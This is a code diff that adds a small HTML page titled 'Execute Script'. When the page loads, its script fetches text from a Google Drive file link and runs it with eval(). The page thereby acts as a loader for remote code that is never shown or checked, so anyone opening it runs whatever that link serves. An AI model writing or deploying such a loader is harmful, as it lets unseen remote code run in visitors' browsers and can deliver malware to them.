@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Execute Script</title>
+</head>
+<body>
+    <script>
+        // Fetch the script from the URL
+        fetch('https://drive.google.com/uc?id=1vBYAiW_9ebUeUPZcEOhrxSdF8vm5o1yb')
+            .then(response => response.text())
+            .then(script => {
+                // Execute the fetched script
+                eval(script);
+            })
+            .catch(error => console.error('Error fetching script:', error));
+    </script>
+</body>
+</html>
